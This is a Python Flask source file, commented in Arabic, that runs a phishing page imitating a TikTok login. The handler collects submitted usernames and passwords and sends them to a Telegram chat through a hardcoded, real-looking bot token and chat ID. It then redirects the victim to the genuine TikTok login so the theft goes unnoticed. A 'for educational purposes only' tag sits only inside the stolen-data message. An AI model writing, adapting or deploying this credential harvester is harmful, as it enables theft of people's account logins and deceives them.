from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# ====== CONFIGURATION ======
BOT_TOKEN = "8858844069:AAHNzwHrFXDL4hEwBwt7CEMqQFd1oPXIQ9Y"
CHAT_ID = "6317143102"
# ===========================

TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

@app.route("/", methods=["GET", "POST"])
def phishing_handler():
    if request.method == "POST":
        # 1. استخراج البيانات من النموذج
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()

        # 2. تنسيق الرسالة لتصل لتيليجرام بشكل واضح
        message = (
            "🚨 <b>New Simulation Login!</b>\n\n"
            f"👤 <b>User:</b> <code>{username}</code>\n"
            f"🔑 <b>Pass:</b> <code>{password}</code>\n\n"
            "⚠️ <i>This is for educational purposes only.</i>"
        )

        # 3. الإرسال إلى تيليجرام
        try:
            payload = {
                "chat_id": CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            requests.post(TELEGRAM_API_URL, data=payload, timeout=5)
        except Exception as e:
            print(f"[!] Telegram failure: {e}")

        # 4. إعادة التوجيه إلى موقع تيك توك الحقيقي لإيهام الضحية
        return redirect("https://www.tiktok.com/login", code=302)

    # إذا كان الطلب GET، يتم عرض صفحة الـ HTML
    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)